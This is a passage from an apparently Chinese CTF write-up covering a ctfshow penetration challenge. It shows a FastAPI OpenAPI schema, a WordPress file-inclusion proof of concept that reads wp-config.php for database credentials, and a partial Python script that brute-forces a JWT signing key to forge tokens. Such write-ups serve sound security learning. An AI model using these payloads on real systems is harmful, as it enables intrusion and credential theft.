punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"file_name"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"File Name"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/downloadTaskFile"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Downloadtaskfile"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"downloadTaskFile_downloadTaskFile_get"</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"url"</span><span class="token punctuation">,</span>            <span class="token property">"in"</span><span class="token operator">:</span> <span class="token string">"query"</span><span class="token punctuation">,</span>            <span class="token property">"required"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>              <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>              <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Url"</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"422"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Validation Error"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                  <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/HTTPValidationError"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/getPhone"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Getphone"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"getPhone_getPhone_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/getServerInfo"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Getip"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"getIP_getServerInfo_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"security"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"/checkServer"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"get"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"summary"</span><span class="token operator">:</span> <span class="token string">"Checkserver"</span><span class="token punctuation">,</span>        <span class="token property">"operationId"</span><span class="token operator">:</span> <span class="token string">"checkServer_checkServer_get"</span><span class="token punctuation">,</span>        <span class="token property">"responses"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"200"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Successful Response"</span><span class="token punctuation">,</span>            <span class="token property">"content"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"application/json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"schema"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"components"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"schemas"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"Body_login_login_post"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"grant_type"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>                <span class="token property">"pattern"</span><span class="token operator">:</span> <span class="token string">"password"</span>              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"null"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Grant Type"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"username"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Username"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"password"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Password"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"scope"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Scope"</span><span class="token punctuation">,</span>            <span class="token property">"default"</span><span class="token operator">:</span> <span class="token string">""</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"client_id"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"null"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Client Id"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"client_secret"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"null"</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Client Secret"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"username"</span><span class="token punctuation">,</span>          <span class="token string">"password"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Body_login_login_post"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"HTTPValidationError"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"detail"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"items"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"$ref"</span><span class="token operator">:</span> <span class="token string">"#/components/schemas/ValidationError"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"array"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Detail"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"HTTPValidationError"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"Token"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"access_token"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Access Token"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"token_type"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Token Type"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"access_token"</span><span class="token punctuation">,</span>          <span class="token string">"token_type"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Token"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token property">"ValidationError"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"loc"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"items"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>              <span class="token property">"anyOf"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token punctuation">&#123;</span>                  <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"integer"</span>                <span class="token punctuation">&#125;</span>              <span class="token punctuation">]</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"array"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Location"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Message"</span>          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>          <span class="token property">"type"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span><span class="token punctuation">,</span>            <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"Error Type"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>        <span class="token property">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token string">"loc"</span><span class="token punctuation">,</span>          <span class="token string">"msg"</span><span class="token punctuation">,</span>          <span class="token string">"type"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"ValidationError"</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"securitySchemes"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"OAuth2PasswordBearer"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"oauth2"</span><span class="token punctuation">,</span>        <span class="token property">"flows"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token property">"password"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"scopes"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"tokenUrl"</span><span class="token operator">:</span> <span class="token string">"login"</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>    <span class="token string">"/login"</span><span class="token punctuation">,</span>    <span class="token string">"/"</span><span class="token punctuation">,</span>    <span class="token string">"/task_newest"</span><span class="token punctuation">,</span>    <span class="token string">"/task_completed"</span><span class="token punctuation">,</span>    <span class="token string">"/task_cancelled"</span><span class="token punctuation">,</span>    <span class="token string">"/message_inbox"</span><span class="token punctuation">,</span>    <span class="token string">"/message_sent"</span><span class="token punctuation">,</span>    <span class="token string">"/messageBox"</span><span class="token punctuation">,</span>    <span class="token string">"/listTaskFiles"</span><span class="token punctuation">,</span>    <span class="token string">"/readTaskFile"</span><span class="token punctuation">,</span>    <span class="token string">"/downloadTaskFile"</span><span class="token punctuation">,</span>    <span class="token string">"/getPhone"</span><span class="token punctuation">,</span>    <span class="token string">"/getServerInfo"</span><span class="token punctuation">,</span>    <span class="token string">"/checkServer"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后猜测得去前面提到的某动保站实际打点一下了，是个wordpress</p><p>直接wpscan扫一下：</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101173857446.png" alt="image-20250101173857446"></p><p>发现有个文件包含，看下poc：<a href="https://wpscan.com/vulnerability/dfe62ff5-956c-4403-b3fd-55677628036b/">https://wpscan.com/vulnerability/dfe62ff5-956c-4403-b3fd-55677628036b/</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//example.com/?aam-media=wp-config.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载 wp-config.php 得到数据库账密</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101174014694.png" alt="image-20250101174014694"></p><p>flag：<code>ctfshow&#123;hsinchug_wp1_Q.4Vyj8VCiedX1KYU5g05&#125;</code></p><hr><h1 id="第二章（Fastapi）"><a href="#第二章（Fastapi）" class="headerlink" title="第二章（Fastapi）"></a>第二章（Fastapi）</h1><h2 id="秘密潜伏"><a href="#秘密潜伏" class="headerlink" title="秘密潜伏"></a>秘密潜伏</h2><p>账密 <code>hsinchug_wp1:Q.4Vyj8VCiedX1KYU5g05</code></p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101174252508.png" alt="image-20250101174252508"></p><p>发现key</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101174645000.png" alt="image-20250101174645000"></p><p>key：<code>4a4f7d6e8b5??Dc7f</code></p><p>总之先把之前 fastapi 的每个接口都测一遍：</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250101180655730.png" alt="image-20250101180655730"></p><p>以下路由需要高权限</p><pre><code>/listTaskFiles/readTaskFile/downloadTaskFile</code></pre><p>现在准备写脚本爆破 jwt</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> jwt<span class="token keyword">import</span> itertools<span class="token keyword">import</span> requests<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 定义 Payload 数据</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"sub"</span><span class="token punctuation">:</span> <span class="token string">"dylan"</span><span class="token punctuation">,</span>    <span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">1735985106</span><span class="token punctuation">&#125;</span><span class="token comment"># 生成所有可能的替换字符</span>possible_chars <span class="token operator">=</span> <span class="token string">"0123456789abcdef"</span>combinations <span class="token operator">=</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span>possible_chars<span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment"># 遍历所有可能的替换字符组合</span><span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span>combinations<span class="token punctuation">)</span><span class="token punctuation">:</span>    chars <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    modified_key <span class="token operator">=</span> <span class="token string">"4a4f7d6e8b5"</span> <span class="token operator">+</span> chars <span class="token operator">+</span> <span class="token string">"0c7f"</span>    <span class="token comment"># print(modified_key)</span>    <span class="token comment"># # 生成 JWT</span>    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token punctuation">(</span>modified_key<span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>    <span class="token comment"># print(token)</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">&#125;</span>    <span class="token comment"># 发送 HTTP 请求</span>    url <span class="token operator">=</span> <span class="token string">'http://94e3c5a5-9608-4bf6-bc9a-519026a4f79c.challenge.ctf.show/'</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span 